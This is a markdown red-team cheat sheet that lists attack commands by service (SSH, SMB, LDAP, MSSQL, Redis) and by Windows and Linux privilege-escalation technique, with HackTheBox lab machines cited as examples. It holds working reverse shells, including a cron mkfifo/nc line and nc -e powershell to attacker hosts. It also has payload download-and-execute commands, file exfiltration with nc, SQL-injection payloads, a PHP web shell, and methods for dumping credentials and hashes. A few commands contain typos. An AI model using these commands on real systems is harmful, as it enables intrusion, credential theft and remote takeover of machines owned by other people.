# RedTeam-CheatSheet



## SSH - 22
Tunneling
```
ssh -L 8443:127.0.0.1:8443 user@x.x.x.x
```

Credentials Spraying
```
ncrack -U users.txt -P pass.txt ssh://x.x.x.x
```
```
hydra -L /Usernames.txt -P Passwords.txt ssh://x.x.x.x
```

## DNS - 53
Perform DNS Zone Transfer check
```
dig axfr x.x.x.x
dig axfr vhost.com @x.x.x.x 
```



## TCPDUMP
```
tcpdump -i eth0 icmp
tcpdump -i any host x.x.x.x
tcpdump -i any port xx
tcpdump -i any src host x.x.x.x
tcpdump -i any dst port xx
```



## SMB
1. SMB Protocol enumeration:
```
nmap -p445 --script smb-protocols x.x.x.x
```


2. Check for SMB Vulnerability
```
nmap --script smb-vuln* x.x.x.x
```

3. Get a list of shares available on a host
```
smbclient -L x.x.x.x
```

4. Connect to the share
```
smbclient //x.x.x.x/Share_Name
```

5. SMBMap for checking access on fileshares
```
smbmap -H x.x.x.x -u Username -p Password or smbmap -u '' -p '' -d 'domain.name' -H x.x.x.x
```

6. Download all files in shares:
```
smbget -R smb://x.x.x.x/Share -U Username
```

7. Use crackmapexec for spraying
```
crackmapexec smb 10.10.10.175 -u Users.txt -p Pass.txt --continue-on-success
```

8. Host smbserver by using impacket
```
impacket-smbserver -smb2support name $(pwd)
```

9. Anonymous login and file enumeration using smbmap
```
smbmap -H x.x.x.x -u anonymous -r --depth
```



## LDAP
1. Basic enumeration
```
ldapsearch -x -h domain.local -b "dc=domain,dc=local"
```

2. Check for Null enumeration
```
ldapsearch -x -h x.x.x.x -D '' -w '' -b "DC=domain,DC=local"
```



## File Transfers
1. certutil
```
certutil -encode file.zip file.b64
cat file.b64 | cmd /c C:\windows\temp\nc.exe attacker_IP 4444
```
And locally:

```
nc -lvp 4444 > file.b64 // Remove certificates markers from top and bottom
sed -i s/\n//g file.b64 // Remove new line
base64 -d file.b64 > file.zip
```

2. certutil -urlcache -split -f http://x.x.x.x/nc.exe C:\\users\public\nc.exe

3. (New-Object Net.WebClient).DownloadFile('http://10.10.14.102:8000/test.txt','test.txt') 

4. iwr -uri http://x.x.x.x:8080/nc.exe -outfile /tmp/nc.exe

## Virtual Host scanning
```
https://github.com/codingo/VHostScan
VHostScan -t local.domain -w /opt/VHostScan/VHostScan/wordlists/virtual-hostscanning.txt
```



## Impacket Script
1. Get Password Hash of User Accounts:
```
python3 GetNPUsers.py local.domain/ -dc-ip 10.10.10.175 -request -usersfile = To provide users
```

later use below command to crack the password:
```
hashcat -m 18200 -a 0 Hash.txt /usr/share/wordlists/rockyou.txt --force
```

2. Enumerate Domain Users
```
python3 GetADUsers.py -all local.domain/User -dc-ip x.x.x.x
```

3. Use this script to check if any user is vulnerable to kerberoasting.
```
GetUserSPNs.py -request -dc-ip x.x.x.x local.domain/user
```



## MSSQL - 1433
1. Use Impacket script - mssqlclient.py for login
```
mssqlclient.py user@x.x.x.x -windows-auth
```

2. Use xp_dirtree "\\x.x.x.x\doesntexist" for getting a User Hash on Responder.

## Oracle - 1521
Use ODAT tool for attacking database

https://github.com/quentinhardy/odat



## Redis - 6379
```
nmap --script redis-info -sV -p 6379 x.x.x.x
```
Either upload a webshell or ssh keys and get access to the box.

https://book.hacktricks.xyz/pentesting/6379-pentesting-redis

## Windows - Privilege Escalation Quick Wins!
1. CHM Priv escalation

https://www.youtube.com/watch?v=k7gD4ufex9Q
https://gist.github.com/mgeeky/cce31c8602a144d8f2172a73d510e0e7

2. SAM & SYSTEM

If we are able to dump both SAM & SYSTEM file, then use following command to dumpnhashes out of it.

impacket-secretdump -sam SAM -system SYSTEM local Then PASS-THE-HASH to tools like smbmap or psexec

3. Juicy Potato

Doesn't work on Win10 and Win2019

whoami /priv to check for following privileges:

• SeImpersonatePrivilege

• SeAssignPrimaryPrivilege

• SeTcbPrivilege

• SeBackupPrivilege

• SeRestorePrivilege

• SeCreateTokenPrivilege

• SeLoadDriverPrivilege

• SeTakeOwnershipPrivilege

• SeDebugPrivilege
https://github.com/ohpe/juicy-potato

Run
```
cmd juicypotato.exe -t * -p “Program to launch” -l 9001
```
Reference Machine - Conceal HTB

4. GPP Password

Use PowerUP.ps1 in order to extract Group Policy Passwords

5. Procdump

Dump process of services running like browsers in order to extract credentials.

6. Kerberoasting by using GetUserSPNs.py Impacket Script

Use this script to check if any user is vulnerable to kerberoasting.
```
GetUserSPNs.py -request -dc-ip x.x.x.x domain.name/user
```

7. Exploiting “runas /savecred"

Use cmdkey /list to check for stored credentials.
```
$WScript = New-Object -ComObject Wscript.Shell
$shortcut = Get-ChildItem shortcut.lnk
$shortcut
$Wscript.CreateShortcut($shortcut)
```

8. Use Mimikatz

Tips

8.1 If it is getting block by group policy, search for Applocker Bypass list.
https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md

8.2 If this list didn't work then go for meterpreter by using Unicorn.

python unicorn.py windows/meterpreter/reverse_http LHOST LPORT

It will generate 2 files:

a. powershell_attack.txt - save it as msf.ps1

b. unicorn.rc - use this to load msfconsole (msfconsole -r unicorn.rc)

Download and run msf.ps1 on Target machine.

8.3 If unicorn is not working then go for Empire.

Reference Machine - Access HTB machine

9. DPAPI

Download masterkey file: c:\users\localuser\appdata\Roaming\Microsoft\Protect\x-x-x-xxxxx-xxxxxx\

Download Credential file: C:\users\localuser\appdata\Roaming\Microsoft\Credentials\

Then on your local machine run following command on mimikatz to get a masterkey:
```
mimikatz# dpapi::masterkey /in:file /sid:sid-of-current-user /password:password-ofcurrent-user
```

It will give you masterkey then run following command to get a cleartext password.
```
mimikatz# dpapi::cred /in:Credentials-filemimikatz# dpapi::cred /in:Credentials-file
```
 

10. ADRecyclebin Deleted Objects Recover

Use below command:

```
Get-ADObject -filter 'isdeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property *
```
Reference link: https://www.poweradmin.com/blog/restoring-deleted-objects-fromactive-directory-using-ad-recycle-bin/

11. AutoLogon Credentials Reuse

After running PowerUp we may end up getting AutoLogon creds which we cn use for escalating privileges

```
$passwd = ConvertTo-SecureString ‘PasswordofAdmin’ -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('administrator' $passwd)
```

A reverse shell can now be opened with the supplied creds using following command:
```
Start-Process -FilePath “powershell” -argumentlist “IEX(New-Object Net.WebClient).downloadString('http://x.x.x.x/InvokePowershellTCP.ps1')” -Credential $creds
```

12. Use cacls

To check Access Control:
```
Get-ACL file.txt | fl *
```
This will allow full access to file if use is a owner of the file.
```
cacls root.txt /t /e /p User:F
```

13. Perform Pass the Hash using pth-winexe
```
pth-winexe -U jeeves/Administrator%NLTMHash //ServerIP cmd
```

14. MS14-680

https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek Reference Machine - Mantis

15. APLC Task Scheduler LPE

https://nvd.nist.gov/vuln/detail/CVE-2018-8440

In order to run this exploit we should have READ EXECUTE Access to Authenticated Users

icacls c:\Windows\Tasks folder

Reference Machine - Conceal

## Linux - Privilege Escalation Quick Wins!
1. SSH Files found:

if id_rsa file found then use ssh2john.py to crack the encypted password.
```
chmod 400 id_rsa
ssh -i id_rsa user@x.x.x.x
```

2. Look for services running locally which are not exposed to the public and to tunnel them to your box.

3. Create SSH keys:

This will create user.pub and user file
```
ssh-keygen -f user
chmod 600 user.pub
ssh -i user localuser@x.x.x.x
```

4. Screen 4.5.0 Local Priv Esc

https://www.exploit-db.com/exploits/41154


5. Use sudo -l to check what commads/ script we can execute as a root user.


6. Redhat/CentOS root through network-scripts

Command execution by simply providing input space command in the script.

https://seclists.org/fulldisclosure/2019/Apr/24

Reference Machine - Networked HTB


7. Vault taken

https://www.vaultproject.io/docs/concepts/tokens.html

Reference Machine - Craft HTB


8. Logstash input as a command

Reference machine - Haystack


9. SystemCTL SUID exploitation


10. PATH Hijacking using pspy

To check which group our user belongs to groups

To find out files and folders owned by group
```
find / -group group_name 2>/dev/null
echo $PATH.
```
Reference Machine - WriteUp HTB

12. Vim
```
sudo /usr/bin/vi /var/www/html/anyfilewhichwecanaccessasaroot -c ‘:!/bin/bash’
```

13. Priv Esc via LXD

https://reboare.github.io/lxd/lxd-escape.html
```
lxc init ubuntu:16.04 blah -c security.privileged=true
lxc config device add blah root disk source=/ path=/mnt/root recursive=true
```
Steps

13.1 Create a alpine build locally.

https://github.com/saghul/lxd-alpine-builder

13.2 Transfer tar.gz file on remote machine.
```
scp yourfile.tar.gz user@x.x.x.x:
```
13.3 Import image in the lxc
```
lxc image import yourfile.tar.gz alpine # if this doesn't work run
lxc image import yourfile.tar.gz --alias alpine
```
13.4 Check if it is imported or not by using
```
lxc image list
```
13.5 Now create a machine
```
lxc init alpine privesc -c security.privileged=true
```
13.6 lxc list to view machine

13.7 Mount hard drive to the machine
```
lxc config device add privesc host-root disk source=/ path=/mnt/root/
```
13.8 Start the container
```
lxc start privesc
```
13.9 lxc exec privesc /bin/sh

Reference Machine - Calamity


14. Module Hijacking

If abc.py script is importing some module from def.py and if we have write access to def.py we can perform a Module Hijacking.
example,
```
shell = ‘’'
* * * * * root rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|n
10.10.14.111 4444 >/tmp/f
‘’'
f =open('/etc/crontab, ‘a’)
f.write(shell)
f.close()
```


15. Inspecting Mozilla Firefox Profile

Check for .mozilla folder.

Gain saved credentials using tools like

firefox_decrypt - https://github.com/unode/firefox_decrypt
firepwd - https://github.com/lclevy/firepwd
Transfer files as
```
cd /tmp
zip -r mozilla.zip ~/.mozilla
nc x.x.x.x 1234 < mozilla.zip
```

16. Linux Capabilities
For the purpose of performing permission checks, traditional UNIX implementations distinguish two categories of processes: privileged processes (whose effective user ID
is 0, referred to as superuser or root) & unprivileged processes (whose effective UID is nonzero). Privileged processes bypass all kernel permission checks, while unprivileged processes are subject to full permission checking based on the process's credentials (usually: effective UID, effective GID, and supplementary group list).

How to detect:
```
getcap -r / 2>/dev/null
```
If you find ep (effective and permitted) binary

then go to gtfobins and exploit it.
example,

https://gtfobins.github.io/gtfobins/openssl/#file-read

With File Read Write ability, modify sudoers

Reference Machine - Lightweight HTB


17. PostgreSQL, PAM and NSS

Enumerate for Passwords under a web directory /var/www/html:
```
grep -iRe password
```
https://serverfault.com/questions/538383/understand-pam-and-nss/538503#538503

Reference Machine - RedCross HTB


18. H2 Database

https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html

H2 is an open source database management system written in Java. Curl is used to verify that the login page is accessible internally.
```
curl -g -6 ‘http://[::1]:8002'
```
ps aux | grep h2 # To detect H2 DBMS version


19. Docker Privileges

id # Check if current user belongs to docker group
```
docker images --all # Reveals available images on the system.
docker run --rm -v /:/hostOS -t1 imageonbox sh
```


20. Homer - Apache CouchDB

Exploit: https://www.exploit-db.com/exploits/44913

Explanation: https://justi.cz/security/2017/11/14/couchdb-rce-npm.html

How to detect by running following command:
```
ps aux
```



## LFI & RFI Scenario
1. If LFI found on system try to fetch common windows file like
```
/windows/system32/license.rtf
/windows/pather/unattend.xml
```


2. In case if you are not getting anything sensitive information or not able to exploit it, go for RFI by hosting a local SMB server and confirm it by running nc on 445 eg.
```
http://example.php?file=\\10.10.14.111\xxx\file.txt
nc -lvnp 445
```
If receive hits on nc it means it is vulnerable to RFI.


3. Also run responder and try to get a NTLMv2 hash
```
responder -I eth0

```


4. Use tcpdump to verify

tcpdump -i eth0 port 445



## RCE Scenario
1. Use nishang's Invoke-PowerShellTcp.ps1


2. If it is not working then check if powershell CONSTRAINED MODE by using following command.
```
powershell.exe $ExecutionContext.SessionState.LanguageMode
```


3. In such a scenario we can drop nc on server via our locally hosted smb server and get a reverse connection.
```
\\10.10.14.111\xxx\nc.exe 10.10.14.111 9001 -e powershell
```
Also we can drop nc.exe by using following command:
```
powershell (New-Object Net.WebClient).downloadString('http://x.x.x.x/nc.exe') 
```
or can also use IWR
```
powershell IWR -uri http://x.x.x.x/nc.exe -OutFile C:\\Windows\\Temp\\nc.exe
cmd /c c:\\windows\\Temp\\nc.exe x.x.x.x 9001 -e powershell.exe
```
Also we can use below command:
```
powershell wget “http://x.x.x.x/nc.exe” -outfile “nc.exe”
nc.exe -e cmd.exe x.x.x.x 1234
```



## SQL Injection Scenario
1. Use EXEC xpcmdshell to execute a command via SQL Injection and try to steal a
hash using responder.
```
id=1;EXEC xp_cmdshell whoami; --
```
or
```
id=1;declare @q varchar(200);set @q='\\x.x.x.x\localshare';exec
master.dbo.xp_dirtress @q; --+
```

2. Use into outfile to write a content in it.
```
http://x.x.x.x/test.php?id=-1 union select 1,lod_file('/etc/passwd'),3,4,5 into outfile ‘/var/
www/html/test.txt’
```
After that visit http://x.x.x.x/test.txt

Also check default 000-default.conf which is under /etc/apache2/sites-enabled/000-dafeult-conf

also one can achieve a web shell by injection a php file:
```
<?php system($_REQUEST["exec"]);?>
```



## LFI to RCE
https://www.alphabot.com/security/blog/2017/java/Misconfigured-JSF-ViewStates-canlead-to-severe-RCE-vulnerabilities.html
https://www.rcesecurity.com/2017/08/from-lfi-to-rce-via-php-sessions/ 

## Reverse Connection Issues
1. If reverse shell dies instantly use following command to check if any sort of intrusion system is present on the box.

find /home -ctime -60 # It will giv all files modified in last 60 minutes on box

In such scenario cp /bin/nc to /dev/shm/newname - rewrite nc to newfile name and try to execute the nc command again.


2. Try listening on port 80 or 443.



## Spawn TTY
1. python3 -c 'import pty; pty.spawn("/bin/sh")'
2. echo os.system('/bin/bash')
3. /bin/sh -i
4. perl —e 'exec "/bin/sh";'
5. ruby: exec "/bin/sh"
6. lua: os.execute('/bin/sh')
7. (From within IRB)
exec "/bin/sh"
8. (From within vi)
:!bash
9. (From within vi)
:set shell=/bin/bash:shell
10. (From within nmap)
!sh
